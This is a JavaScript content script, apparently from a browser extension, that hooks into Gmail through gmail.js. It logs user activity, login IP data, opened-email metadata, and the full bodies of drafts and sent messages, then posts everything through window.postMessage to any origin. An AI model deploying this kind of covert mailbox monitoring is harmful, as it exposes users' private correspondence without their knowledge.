var gmail;
var composeDraftBeat;
var didDraft = false;
var lastDraftId;
var oldPage;
var now;
var hangouts = false;

function sendMessage(gmailbeat){
  //console.log(gmailbeat);
  window.postMessage({greeting: "gmail", gmailbeat: gmailbeat}, '*');
}

function refresh(f) {
  if( (/in/.test(document.readyState)) || (undefined === Gmail) ) {
    setTimeout('refresh(' + f + ')', 10);
  } else {
    f();
  }
}

var main = function(){
  // NOTE: Always use the latest version of gmail.js from
  // https://github.com/KartikTalwar/gmail.js
  gmail = new Gmail();

  oldPage = gmail.get.current_page();
  now = gmail.get.current_page();
  sendMessage(accessedGmail());
  onObserver();
  //console.log(gmail.get.user_email());

}
refresh(main);

//INterval check every 5 seconds for click, scroll and key events
setInterval(function() {
    onObserver();
    try{
      now = gmail.get.current_page();
      if(now != oldPage){
        if(gmail.get.current_page() != null){
          oldPage = now;
          sendMessage(returnCurrentPage("location changed"));
        } else{}//do nothing;
      }
    }catch(e){

    }

    if(didDraft) {
        didDraft = false;
        //sendHeartBeat(composeBeat);
        sendMessage(composeDraftBeat);
    }
}, 5000);

function throttle (func, wait) {
    return function() {
        var that = this,
            args = [].slice(arguments);

        clearTimeout(func._throttleTimeout);

        func._throttleTimeout = setTimeout(function() {
            func.apply(that, args);
        }, wait);
    };
}

$(function(){
  // Throttled resize function
  $(this).on('keyup keypress click scroll change', throttle(function(e){  
    //trigger();
    sendMessage(returnCurrentPage("event"));
  }, 4000));
});



function onObserver(){
  try{
    gmail.observe.off();

    //on email open - Gmail
    gmail.observe.on("open_email", function(id, url, body, xhr) {    
      var data = gmail.get.email_data(id).last_email;
      var threadid = gmail.get.email_data(id).thread_id;//get email thread id

      /*console.log(openEmailDetails(id, data));
      console.log(gmail.get.email_data(id));*/
      sendMessage(openEmailDetails(id, data, "open"))
    });

    gmail.observe.on("save_draft", function(id, url, body, data, xhr) {    
      //console.log(sendEmailDetails(body));
      if(sendEmailDetails(body).to != "" || sendEmailDetails(body).subject != ""){
        composeDraftBeat = sendEmailDetails(body, "draft");
        lastDraftId = id;
        didDraft = true;
        sendMessage(composeDraftBeat);
      } else{
        //do nothing if recipient OR subject not available
      }
    });

    gmail.observe.before("send_message", function(id, url, body, data, xhr) {    
      //console.log(sendEmailDetails(body));
      if(id == lastDraftId && didDraft == true){
        didDraft = false;
        sendMessage(sendEmailDetails(body, "send")); 
      }else{
        sendMessage(sendEmailDetails(body, "send")); 
      }
    });

    gmail.observe.after("refresh", function(id, url, body, data, xhr) {    
        //console.log(gmail.get.current_page());
        now = gmail.get.current_page();
        if(now != oldPage){
          if(gmail.get.current_page() != null){
            oldPage = now;
            sendMessage(returnCurrentPage("event"));
          } else{}//do nothing;
        }
    });

    //############################################################################################################################

    /*// DOM observers
    gmail.observe.on("compose", function(compose, type) {
      // type can be compose, reply or forward
      console.log('api.dom.compose object:', compose, 'type is:', type );  // gmail.dom.compose object
    });
    */
    //gmail.observe.on('view_thread', function(obj) {
      //console.log('conversation thread opened', obj); // gmail.dom.thread object
    //});
    /*
    gmail.observe.on('load_email_menu', function(match) {
      console.log('Menu loaded',match);

      // insert a new element into the menu
      $('<div />').addClass('J-N-Jz')
          .html('New element')
          .appendTo(match);
    });*/
  }catch(e){
    
  }
}

function accessedGmail(){
    var data = GLOBALS[17];
    var l = data[14];
    var lastActive = {time : l[1], ip : l[3], time_stamp : l[12], time_relative : l[10]};
    return {
              "action" : "logged in!",
              "timestamp" : timestamp = (new Date).getTime(),
              "current_page" : gmail.get.current_page(),
              "user_email" : gmail.get.user_email(),
              "last_active" : lastActive
           };
}

function returnCurrentPage(action){
  var timestamp;
    return {
      "action" : action,
      "timestamp" : timestamp = (new Date).getTime(),
      "current_page" : gmail.get.current_page(),
      "user_email" : gmail.get.user_email()
    }
}

function openEmailDetails(id, threadid, action){
  var emailData = gmail.get.email_data(id);
  var emailDetail = gmail.get.email_data(id).threads[threadid];
    var attatchments; //documents files attached to email
    var bcc; // Blind Carbon Copy - sent to multiple emails
    var cc; // Carbon Copy - sent to another email
    var content_html; //email body content with html formatting
    var content_plain; //email body content - plain text
    var datetime; // day month and year + time when email was sent
    var from; // name of person who sent the email
    var from_email; //email of person who sent the email or third party email company 
    var reply_to; // true or false - if it was a reply to a previous email
    var reply_to_id; // id of the previous reply email
    var subject; // subject of the email
    var timestamp; // timestamp of when the emailw as sent
    var to; // recipient that is receiving the email.

    attatchments = emailDetail.attatchments;
    bcc = emailDetail.bcc;
    cc = emailDetail.cc;
    from = emailDetail.from;
    from_email = emailDetail.from_email;
    subject = emailDetail.subject;
    content_html = emailDetail.content_html;
    content_plain = emailDetail.content_plain;
    datetime = emailDetail.datetime;
    timestamp = emailDetail.timestamp;
    to = emailDetail.to[0];

    return {
      "action" : action,
      "attatchments" : attatchments,
      "bcc" : bcc,
      "cc" : cc,
      "from" : from,
      "from_email" : from_email,
      "to" : to,
      "subject" : subject,
      //"content_html" : content_html,
      //"content_plain" : content_plain,
      "datetime" : datetime,
      "timestamp" : timestamp

    };
}

function sendEmailDetails(data, action){
	var bcc; // Blind Carbon Copy - sent to multiple emails
    var cc; // Carbon Copy - sent to another email
	var body; //email body
	var composedid; //compose id
	var draft; //draft id 
	var from; //from who the email is being sent
	var subject; //email subject
	var uet; //reply to email
	var to;

	bcc = data.bcc;
	cc = data.cc;
	body = data.body;
	composedid = data.composeid;
	draft = data.draft;
	from = data.from;
	subject = data.subject;
	uet = data.uet;
	to = data.to[0] + " | " +data.to[1];

	return {
      "action" : action,
      "bcc" : bcc,
      "cc" : cc,
      "from" : from,
      "to" : to,
      "subject" : subject,
      "body" : body,
      "uet" : uet,
      "composedid" : composedid,
      "draft" : draft,
      "timestamp" : timestamp = (new Date).getTime()
    };
}
